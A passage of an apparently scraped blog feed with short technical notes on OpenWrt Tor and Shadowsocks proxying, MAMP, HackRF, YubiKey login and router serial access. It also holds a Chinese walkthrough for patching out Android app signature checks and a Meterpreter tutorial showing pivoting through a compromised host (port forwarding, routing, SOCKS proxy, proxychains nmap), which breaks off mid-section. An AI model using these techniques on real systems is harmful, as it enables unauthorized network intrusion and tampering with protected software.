    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; opkg update</span><br><span class="line">&gt; opkg install tor</span><br></pre></td></tr></table></figure><p>root@OpenWrt:~# vi /etc/tor/torrc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">RunAsDaemon 0  </span><br><span class="line">DataDirectory /var/lib/tor  </span><br><span class="line">User tor  </span><br><span class="line">Socks5Proxy 127.0.0.1:1080</span><br><span class="line">SocksPort 0.0.0.0:9050  </span><br><span class="line">TransPort 0.0.0.0:9040  </span><br><span class="line">DNSPort 0.0.0.0:53  </span><br><span class="line">AvoidDiskWrites 1</span><br></pre></td></tr></table></figure></p><p>root@OpenWrt:~# vi /etc/config/dhcp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config dnsmasq</span><br><span class="line">       option noresolv &apos;1&apos;</span><br><span class="line">       list server &apos;127.0.0.1#53&apos;</span><br></pre></td></tr></table></figure></p><p>root@OpenWrt:~# /etc/init.d/tor stop<br>root@OpenWrt:~# tor</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;
      
    
    </summary>
    
    
      <category term="Openwrt" scheme="https://blog.safebuff.com/tags/Openwrt/"/>
    
  </entry>
  
  <entry>
    <title>Openwrt install Shadowsocks auto Proxy</title>
    <link href="https://blog.safebuff.com/2017/02/26/Openwrt-install-Shadowsocks-auto-Proxy/"/>
    <id>https://blog.safebuff.com/2017/02/26/Openwrt-install-Shadowsocks-auto-Proxy/</id>
    <published>2017-02-26T04:37:56.000Z</published>
    <updated>2018-10-12T07:36:11.576Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; opkg update</span><br><span class="line">&gt; opkg install ip ip-full iptables-mod-tproxy ipset libopenssl iptables-mod-tproxy</span><br><span class="line">&gt; wget https://github.com/aa65535/openwrt-chinadns/releases/download/v1.3.2-4/ChinaDNS_1.3.2-4_ar71xx.ipk</span><br><span class="line">&gt; wget https://github.com/aa65535/openwrt-dist-luci/releases/download/v1.6.0/luci-app-chinadns_1.6.0-1_all.ipk</span><br><span class="line">&gt; opkg install *.ipk</span><br></pre></td></tr></table></figure><h4 id="ChinaDNS"><a href="#ChinaDNS" class="headerlink" title="ChinaDNS"></a>ChinaDNS</h4><p>Services &gt;&gt; ChinaDNS</p><table><thead><tr><th>header 1</th><th>header 2</th></tr></thead><tbody><tr><td>Enable</td><td>☑️</td></tr><tr><td>Enable Bidirectional Filter</td><td>☑️ help Also filter results inside China from foreign DNS servers</td></tr><tr><td>Local Port</td><td>5353</td></tr><tr><td>CHNRoute File</td><td>/etc/chinadns_chnroute.txt</td></tr><tr><td>Upstream Servers</td><td>180.76.76.76,8.8.4.4</td></tr></tbody></table><p>root@OpenWrt:~# crontab -e</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 * * * wget -O- &apos;http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest&apos; | awk -F\| &apos;/CN\|ipv4/ &#123; printf(&quot;%s/%d\n&quot;, $4, 32-log($5)/log(2)) &#125;&apos; &gt; /etc/chinadns_chnroute.txt</span><br></pre></td></tr></table></figure><h4 id="Shadowsocks"><a href="#Shadowsocks" class="headerlink" title="Shadowsocks"></a>Shadowsocks</h4><p><strong>Services &gt;&gt; ShadowSocks &gt;&gt; General Settings &gt;&gt; Transparent Proxy</strong></p><table><thead><tr><th>header 1</th><th>header 2</th></tr></thead><tbody><tr><td>Main Server</td><td>[Shadowsocks server IP:Port]</td></tr><tr><td>UDP-Relay Server</td><td>Same as Main Server</td></tr><tr><td>Local Port</td><td>1234</td></tr></tbody></table><p><strong>Services &gt;&gt; ShadowSocks &gt;&gt; SOCKS5 Proxy</strong></p><table><thead><tr><th>header 1</th><th>header 2</th></tr></thead><tbody><tr><td>Server</td><td>[Shadowsocks Server IP:Server Port]</td></tr><tr><td>Local Port</td><td>1080</td></tr></tbody></table><p><strong>Services &gt;&gt; ShadowSocks &gt;&gt; Servers Manage &gt;&gt; Edit</strong></p><table><thead><tr><th>header 1</th><th>header 2</th></tr></thead><tbody><tr><td>Server</td><td>[Shadowsocks IP]</td></tr><tr><td>Server Port</td><td>[Shadowsocks Port]</td></tr><tr><td>Connection Timeout</td><td>60</td></tr><tr><td>Password</td><td>password</td></tr><tr><td>Encrypt Method</td><td>AES-256-CFB</td></tr><tr><td>Plugin Name</td><td></td></tr><tr><td>Plugin Arguments</td><td></td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
      <category term="Openwrt" scheme="https://blog.safebuff.com/tags/Openwrt/"/>
    
  </entry>
  
  <entry>
    <title>Mac OSX install MAMP mongo-php-driver</title>
    <link href="https://blog.safebuff.com/2017/02/25/Mac-OSX-install-MAMP-mongo-php-driver/"/>
    <id>https://blog.safebuff.com/2017/02/25/Mac-OSX-install-MAMP-mongo-php-driver/</id>
    <published>2017-02-25T14:15:23.000Z</published>
    <updated>2018-10-12T07:36:11.567Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; brew install openssl autoconf</span><br><span class="line">&gt; echo &apos;export PATH=&quot;/usr/local/opt/openssl/bin:$PATH&quot;&apos; &gt;&gt; ~/.zshrc</span><br><span class="line">&gt; sudo /Applications/MAMP/bin/php/php5.6.10/bin/pecl install mongodb</span><br></pre></td></tr></table></figure><p>open MAMP Pro &gt; File &gt; Edit Template &gt; PHP &gt; php5.6.10.ini<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MAMP_apc_MAMP</span><br><span class="line">extension=imap.so</span><br><span class="line">extension=gettext.so</span><br><span class="line">extension=mcrypt.so</span><br><span class="line">extension=yaz.so</span><br><span class="line">extension=pgsql.so</span><br><span class="line">extension=pdo_pgsql.so</span><br><span class="line">extension=mongodb.so</span><br></pre></td></tr></table></figure></p><p>open <a href="http://127.0.0.1/phpinfo.php" target="_blank" rel="noopener">http://127.0.0.1/phpinfo.php</a> grep mongodb</p><p><strong>Q1</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">running: phpize</span><br><span class="line">grep: /Applications/MAMP/bin/php/php5.6.10/include/php/main/php.h: No such file or directory</span><br><span class="line">grep: /Applications/MAMP/bin/php/php5.6.10/include/php/Zend/zend_modules.h: No such file or directory</span><br><span class="line">grep: /Applications/MAMP/bin/php/php5.6.10/include/php/Zend/zend_extensions.h: No such file or directory</span><br></pre></td></tr></table></figure></p><p><strong>fix</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/usr/include/ /Applications/MAMP/bin/php/php5.6.10/include</span><br></pre></td></tr></table></figure></p><p><strong>Q2</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private/tmp/pear/install/mongodb/src/libbson/src/bson/ -DHAVE_CONFIG_H -g -O2 -D_THREAD_SAFE -pthread -c /private/tmp/pear/install/mongodb/src/libmongoc/src/mongoc/mongoc-crypto-openssl.c  -fno-common -DPIC -o src/libmongoc/src/mongoc/.libs/mongoc-crypto-openssl.o</span><br><span class="line">/private/tmp/pear/install/mongodb/src/libmongoc/src/mongoc/mongoc-crypto-openssl.c:24:10: fatal error: &apos;openssl/sha.h&apos; file not found</span><br><span class="line">#include &lt;openssl/sha.h&gt;</span><br><span class="line">         ^</span><br><span class="line">1 error generated.</span><br></pre></td></tr></table></figure></p><p><strong>fix</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; cd /usr/local/include </span><br><span class="line">&gt; ln -s ../opt/openssl/include/openssl .</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HackRF for Mac OSX</title>
    <link href="https://blog.safebuff.com/2017/02/03/HackRF-for-Mac-OSX/"/>
    <id>https://blog.safebuff.com/2017/02/03/HackRF-for-Mac-OSX/</id>
    <published>2017-02-03T13:29:15.000Z</published>
    <updated>2018-10-12T07:36:11.559Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-Install-Tools"><a href="#0x01-Install-Tools" class="headerlink" title="0x01 Install Tools"></a>0x01 Install Tools</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; brew install libusb sox hackrf gnuradio librtlsdr</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-Install-Tools&quot;&gt;&lt;a href=&quot;#0x01-Install-Tools&quot; class=&quot;headerlink&quot; title=&quot;0x01 Install Tools&quot;&gt;&lt;/a&gt;0x01 Install Tools&lt;/h3&gt;&lt;figure c
      
    
    </summary>
    
    
      <category term="HackRF" scheme="https://blog.safebuff.com/tags/HackRF/"/>
    
  </entry>
  
  <entry>
    <title>Yubikey4 Two-factor authentication</title>
    <link href="https://blog.safebuff.com/2017/02/03/Yubikey4-Two-factor-authentication/"/>
    <id>https://blog.safebuff.com/2017/02/03/Yubikey4-Two-factor-authentication/</id>
    <published>2017-02-03T10:15:17.000Z</published>
    <updated>2018-10-12T07:36:11.607Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; brew install libyubikey pam_yubico yubico-piv-tool Caskroom/cask/yubikey-piv-manager</span><br></pre></td></tr></table></figure><h4 id="关闭osx-sip机制"><a href="#关闭osx-sip机制" class="headerlink" title="关闭osx sip机制"></a>关闭osx sip机制</h4><p>重启按住Command + R进入重置模式&gt;&gt;选择语言&gt;&gt;实用工具&gt;&gt;终端,输入如下命令关闭<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; csrutil disable</span><br></pre></td></tr></table></figure></p><p>反之开启命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; csrutil enable</span><br></pre></td></tr></table></figure></p><p>插入yubico4，打开YubiKey PIV Manager<br>点击Setup for macOS设置PIN</p><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><a href="https://developers.yubico.com/yubico-pam/Releases/pam_yubico-2.23.pkg" target="_blank" rel="noopener">pam_yubico</a></p><p><a href="https://developers.yubico.com/yubikey-personalization-gui/Releases/yubikey-personalization-gui-3.1.24.pkg" target="_blank" rel="noopener">yubikey-personalization-gui</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo ln -s /usr/local/Cellar/pam_yubico/2.23/lib/security/pam_yubico.so /usr/local/lib/security/pam_yubico.so</span><br><span class="line">&gt; sudo vi /etc/pam.d/authorization</span><br><span class="line"># authorization: auth account</span><br><span class="line">auth    optional    pam_krb5.so use_first_pass use_kcminit</span><br><span class="line">auth    optional    pam_ntlm.so use_first_pass</span><br><span class="line">auth    required    pam_opendirectory.so use_first_pass nullok</span><br><span class="line">auth    required    /usr/local/lib/security/pam_yubico.so mode=challenge-response</span><br><span class="line">auth    required    pam_opendirectory.so</span><br></pre></td></tr></table></figure><p>重启电脑输入PIN密码</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;
      
    
    </summary>
    
    
      <category term="Yubikey4" scheme="https://blog.safebuff.com/tags/Yubikey4/"/>
    
  </entry>
  
  <entry>
    <title>Android bypass so file Signature</title>
    <link href="https://blog.safebuff.com/2017/01/26/Android-bypass-so-file-Signature/"/>
    <id>https://blog.safebuff.com/2017/01/26/Android-bypass-so-file-Signature/</id>
    <published>2017-01-25T17:02:18.000Z</published>
    <updated>2018-10-12T07:36:11.527Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-介绍签名校验"><a href="#0x01-介绍签名校验" class="headerlink" title="0x01 介绍签名校验"></a>0x01 介绍签名校验</h3><p>在介绍签名校验的方式前，需要先明确dex文件校验和签名校验：</p><p>1、将apk以压缩包的形式打开删除原签名后，再签名，安装能够正常打开，但是用IDE工具反编译(classes.dex)后再二次打包，却出现非正常情况的，如：闪退/弹出非正版提示框。可以确定是dex文件校验。</p><p>2、将apk以压缩包的形式打开删除原签名再签名，安装之后打开异常的，则基本可以断定是签名检验。如果在断网的情况下同样是会出现异常，则是本地的签名检验。如果首先出现的是提示网络没有连接，则是服务器端的签名校验。对于Android编程我们知道分为SDK编程和NDK编程，当然Android签名校验也都是通过SDK或NDK来实现的。SDK编程也就是我们通常所说的java端的即编译出来的classes.dex静态校验，NDK编程也就是C / C++端的即编译出来的*.so动态加载的校验。</p><p>总结：</p><ol><li><p>Java层一般通过getPackageManager().getPackageInfo.signatures来获取签名信息。</p></li><li><p>NDK层一般调用Native方法/DLL/Lua脚本等通过获取Java的context/Activity对象，动态JNI反射调用getPackageInfo等来获取签名。</p></li></ol><h3 id="0x02-dex情况下"><a href="#0x02-dex情况下" class="headerlink" title="0x02 dex情况下"></a>0x02 dex情况下</h3><p>搜索如下可能调用签名方法的关键字符串</p><blockquote><p>grep -R ‘java/security/Signature;-&gt;verify([B)Z’ ./</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;signatures&quot;</span><br><span class="line">&quot;[Landroid/content/pm/Signature&quot; &quot;Landroid/content/pm/PackageInfo;-&gt;signatures:[Landroid/content/pm/Signature&quot;</span><br><span class="line">&quot;Ljava/security/Signature;-&gt;verify([B)Z&quot;</span><br></pre></td></tr></table></figure><p>注释move-result，增加const/4<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#move-result vx  //x代码数字0或者1..</span><br><span class="line">const/4 vx, 0x1</span><br></pre></td></tr></table></figure></p><h3 id="0x03-so情况下"><a href="#0x03-so情况下" class="headerlink" title="0x03 so情况下"></a>0x03 so情况下</h3><p>搜索如下可能调用so库方法的关键字符串</p><blockquote><p>grep -R ‘loadLibrary’ ./</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;loadLibrary&quot;</span><br><span class="line">&quot;Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; grep -R &apos;\.so$&apos; ./</span><br><span class="line">&gt; strings xx.so|grep -i signature</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. ida &gt;&gt; 打开xx.so文件</span><br><span class="line">2. 搜索signature 勾选上Find all occurences</span><br><span class="line">3. 在搜索的function中单击进入&gt;&gt;右击选择Graph view切换图形视图，找到最后一行关键跳转&gt;&gt; 右键选择Text view切换回文本视图 &gt;&gt; F5看一下C语言代码</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BEQ指令是“相等（或为0）跳转指令”</span><br><span class="line">BNE指令是“不相等（或不为0）跳转指令”</span><br><span class="line">B指令是“无条件跳转指令”</span><br><span class="line">CBZ 指令是“比较，为零则跳转”</span><br><span class="line">CBNZ指令是“比较，为非零则跳转”</span><br><span class="line"></span><br><span class="line">BNE跳转指令对应的HEX机器码是D1</span><br><span class="line">BEQ跳转指令对应的HEX机器码是D0</span><br><span class="line">CBZ跳转指令对应的HEX机器码是B1</span><br><span class="line">CBNZ跳转指令对应的HEX机器码是B9</span><br></pre></td></tr></table></figure><h3 id="0x04-修改保存"><a href="#0x04-修改保存" class="headerlink" title="0x04 修改保存"></a>0x04 修改保存</h3><ol><li>首先我们在IDA View 中显示 十六进制机器码, Options -&gt; General -&gt; Disassembly -&gt; Number of opcode bytes = 8</li><li>ida&gt;&gt;Edit-&gt;Patch Program</li><li>然后Edit-&gt;Patch Program-&gt;Change byte</li><li>将对应的hex机器码修改，比如D0改为D1</li><li>Edit-&gt;Patch Program-&gt;Apple patches to input file</li><li>点击ok即可</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-介绍签名校验&quot;&gt;&lt;a href=&quot;#0x01-介绍签名校验&quot; class=&quot;headerlink&quot; title=&quot;0x01 介绍签名校验&quot;&gt;&lt;/a&gt;0x01 介绍签名校验&lt;/h3&gt;&lt;p&gt;在介绍签名校验的方式前，需要先明确dex文件校验和签名校验：&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="Bypass" scheme="https://blog.safebuff.com/tags/Bypass/"/>
    
  </entry>
  
  <entry>
    <title>Router TTL mode</title>
    <link href="https://blog.safebuff.com/2017/01/04/Router-TTL-mode/"/>
    <id>https://blog.safebuff.com/2017/01/04/Router-TTL-mode/</id>
    <published>2017-01-04T14:28:54.000Z</published>
    <updated>2018-10-12T07:36:11.589Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.prolific.com.tw/UserFiles/files/PL2303_MacOSX_1_6_1_20160309.zip" target="_blank" rel="noopener">Download</a> PL2303 Devices<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; brew install minicom</span><br><span class="line">&gt; ls /dev/tty.*     //find tty.usbserial</span><br><span class="line"></span><br><span class="line">/dev/tty.-WirelessiAP            /dev/tty.-WirelessiAP-1          /dev/tty.Bluetooth-Incoming-Port /dev/tty.smilentMacBookPro-Bluet /dev/tty.usbserial-UUT</span><br><span class="line">&gt; sudo minicom -s</span><br></pre></td></tr></table></figure></p><p>1). Select “Serial port setup”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------------------------------------------------+</span><br><span class="line">| A -    Serial Device      : /dev/tty.usbserial-UUT                    |</span><br><span class="line">| B - Lockfile Location     : /usr/local/Cellar/minicom/2.7/var         |</span><br><span class="line">| C -   Callin Program      :                                           |</span><br><span class="line">| D -  Callout Program      :                                           |</span><br><span class="line">| E -    Bps/Par/Bits       : 115200 8N1                                |</span><br><span class="line">| F - Hardware Flow Control : No                                        |</span><br><span class="line">| G - Software Flow Control : No                                        |</span><br><span class="line">|                                                                       |</span><br><span class="line">|    Change which setting?                                              |</span><br><span class="line">+-----------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>2). Save setup as dfl</p><p>3). Exit</p><p>4)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo minicom -s</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://www.prolific.com.tw/UserFiles/files/PL2303_MacOSX_1_6_1_20160309.zip&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Download&lt;/a&gt; PL2303 
      
    
    </summary>
    
    
      <category term="Router" scheme="https://blog.safebuff.com/tags/Router/"/>
    
  </entry>
  
  <entry>
    <title>Meterpreter Proxy and Route</title>
    <link href="https://blog.safebuff.com/2017/01/02/Meterpreter-Proxy-and-Route/"/>
    <id>https://blog.safebuff.com/2017/01/02/Meterpreter-Proxy-and-Route/</id>
    <published>2017-01-01T16:49:27.000Z</published>
    <updated>2018-10-12T07:36:11.570Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-portfwd"><a href="#0x01-portfwd" class="headerlink" title="0x01 portfwd"></a>0x01 portfwd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 1234 -r 192.168.0.105 -p 3389</span><br><span class="line">[*] Local TCP relay created: :1234 &lt;-&gt; 192.168.0.105:3389</span><br><span class="line">meterpreter &gt; portfwd</span><br><span class="line"></span><br><span class="line">Active Port Forwards</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Index  Local         Remote              Direction</span><br><span class="line">   -----  -----         ------              ---------</span><br><span class="line">   1      0.0.0.0:1234  192.168.0.105:3389  Forward</span><br><span class="line"></span><br><span class="line">1 total active port forwards.</span><br><span class="line">&gt; rdesktop 127.1.1.0:1234</span><br></pre></td></tr></table></figure><h3 id="0x02-pivot"><a href="#0x02-pivot" class="headerlink" title="0x02 pivot"></a>0x02 pivot</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(web_delivery) &gt; route add 192.168.0.0 255.255.255.0 1</span><br><span class="line">[*] Route added</span><br><span class="line">msf exploit(web_delivery) &gt; route</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.0.0        255.255.255.0      Session 1</span><br><span class="line"></span><br><span class="line">msf exploit(web_delivery) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Type                    Information              Connection</span><br><span class="line">  --  ----                    -----------              ----------</span><br><span class="line">  1   meterpreter python/osx  xl7dev  192.168.0.105:4444 -&gt; 192.168.0.105:50834 (192.168.0.105)</span><br><span class="line">msf exploit(web_delivery) &gt; use auxiliary/server/socks4a</span><br><span class="line">msf auxiliary(socks4a) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/server/socks4a):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The address to listen on</span><br><span class="line">   SRVPORT  1080             yes       The port to listen on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy</span><br><span class="line">msf auxiliary(socks4a) &gt; exploit -y</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br><span class="line">[*] Starting the socks4a proxy server</span><br><span class="line">&gt; vi /etc/proxychains.conf</span><br><span class="line">socks4  127.0.0.1 1080</span><br><span class="line">&gt; proxychains4 nmap -sT -Pn 192.168.0.100</span><br></pre></td></tr></table></figure><h3 id="0x03-autoroute"><a href="#0x03-autoroute" class="headerlink" title="0x03 autoroute"></a>0x03 autoroute</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -h</span><br><span class="line">[*] Usage:   run autoroute [-r] -s subnet -n netmask</span><br><span class="line">[*] Examples:</span><br><span class="line">[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0</span><br><span class="line">[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0</span><br><span class="line">[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay</span><br><span class="line">[*]   run autoroute -p                            # Print active routing table</span><br><span class="line">[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route</span><br><span class="line">[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes</span><br><span class="line">[-] Deprecation warning: This script has been replaced by the post/windows/manage/autoroute module</span><br><span class="line">meterpreter &gt; run autoroute -s 192.168.0.1/24</span><br><span class="line">[*] Adding a route to 192.168.0.1/255.255.255.0...</span><br><span class="line">[+] Added route to 192.168.0.1/255.255.255.0 via 192.168.0.105</span><br><span class="line">[*] Use the -p option to list all active routes</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf auxiliary(web_delivery) &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="0x04-Multilayer-Proxy"><a href="#0x04-Multilayer-Proxy" class="headerlink" title="0x04 Multilayer Proxy"></a>0x04 Multilayer Proxy</h3><p>attacker-&gt;target1-&gt;target2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 